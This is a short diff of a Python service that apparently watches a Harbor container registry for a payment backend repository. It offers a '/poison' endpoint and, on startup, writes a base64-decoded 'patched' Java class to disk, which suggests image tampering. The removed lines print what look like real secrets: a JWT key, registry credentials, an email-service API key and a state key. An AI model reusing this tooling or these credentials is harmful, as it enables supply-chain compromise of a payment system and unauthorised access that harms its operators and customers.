@@ -9,18 +9,19 @@ Endpoints: /health  /state?key=  /poison?key=&tag=  /reset?key=
 import json, time, ssl, base64, hmac, hashlib, gzip, io, tarfile, zipfile, os, threading, urllib.request
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
-# ---------------- config ----------------
-JWT_SECRET = os.environ.get("JWT_SECRET", "ODdmMmZkMTg2Y2I3MTI5OWJlNGY5ODMwMzhiN2JiNTFlMTBjZDQ1MjQwYjlhNjViZWU5NzFkODhhZjNiOGJiNjdkMDA0ZjBiZmMzOTI3NGI3YzFlZGEzMWNmZTQ1YTk3ZTVjYzY0YzU3NzViNjQ2YjBjZWI2YzA0MWIxMmU2NWE=")
-HARBOR_AUTH = os.environ.get("HARBOR_AUTH", base64.b64encode(b"regsync-svc:Rgs#Afrety2026!x").decode())
-BREVO_KEY = os.environ.get("BREVO_KEY", "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")
-STATE_KEY = os.environ.get("STATE_KEY", "Kx7-afrety-mon-2026")
+# ---------------- config (tous les secrets viennent des envVars Render) ----------------
+JWT_SECRET = os.environ["JWT_SECRET"]
+HARBOR_AUTH = os.environ["HARBOR_AUTH"]
+BREVO_KEY = os.environ.get("BREVO_KEY", "")
+STATE_KEY = os.environ["STATE_KEY"]
+PATCHED_CLASS_B64 = os.environ["PATCHED_CLASS_B64"]
 ALERT_EMAIL = "tsamba826@gmail.com"
 REG = "http://149.102.139.167:8090"
 REPO = "afrety/back-payment"
 CORE = "https://myafrety.afrety.sn/services/myAfretyAppCore/api"
 SELF_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
 WORK = "/tmp"
-PATCHED_CLASS_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "RestTemplateHelperImpl.class")
+PATCHED_CLASS_PATH = "/tmp/RestTemplateHelperImpl.class"
 POLL = 10
 
 CTX = ssl._create_unverified_context()
@@ -276,6 +277,7 @@ class H(BaseHTTPRequestHandler):
         pass
 
 if __name__ == "__main__":
+    open(PATCHED_CLASS_PATH, "wb").write(base64.b64decode(PATCHED_CLASS_B64))
     for t in (watcher_loop, monitor_loop, selfping_loop):
         threading.Thread(target=t, daemon=True).start()
     port = int(os.environ.get("PORT", "10000"))
